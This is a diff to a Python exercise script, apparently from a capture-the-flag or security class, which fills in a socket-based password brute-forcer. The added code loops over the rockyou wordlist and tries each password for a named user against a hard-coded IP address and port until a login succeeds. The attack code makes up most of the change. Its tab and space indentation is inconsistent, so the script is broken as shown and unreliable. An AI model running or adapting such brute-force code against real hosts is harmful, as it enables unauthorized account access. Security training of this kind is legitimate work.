@@ -1,3 +1,4 @@
+
 """
     If you know the IP address of the Briong server and you
     know the port number of the service you are trying to connect
@@ -25,10 +26,11 @@
 """
 
 import socket
+import time
 
-host = "142.93.118.186" # IP address here
-port = 22 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "142.93.117.193" # IP address here
+port = 1337 # Port here
+wordlist = "/root/Downloads/rockyou.txt" # Point to wordlist file
 
 def brute_force():
     """
@@ -54,16 +56,26 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             the Briong server.
     """
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-    username = "kruegster"   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-    s.send("username\n")   # Send a newline \n at the end of your command
-    s.send("password\n")   # Send a newline \n at the end of your command
-    data = s.recv(2048)     # Receives 1024 bytes from IP/Port
-    print(data)             # Prints data
+    with open(wordlist, 'r') as f:
+	for line in f:
+    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    	s.connect((host, port))
+		username = "kruegster"   # Hint: use OSINT
 
+		s.send(username+"\n")
+		data= s.recv(1012)
+		print(data + " " + username)
 
+		s.send(line)
+		data+= s.recv(1012)
+		print("Password " +  line)
+		print("\n")
+
+		data+= s.recv(1012)
+		print(data)
+		if ("Fail\n" not in data):
+			break
+	print("ENDED")
 
 
 if __name__ == '__main__':
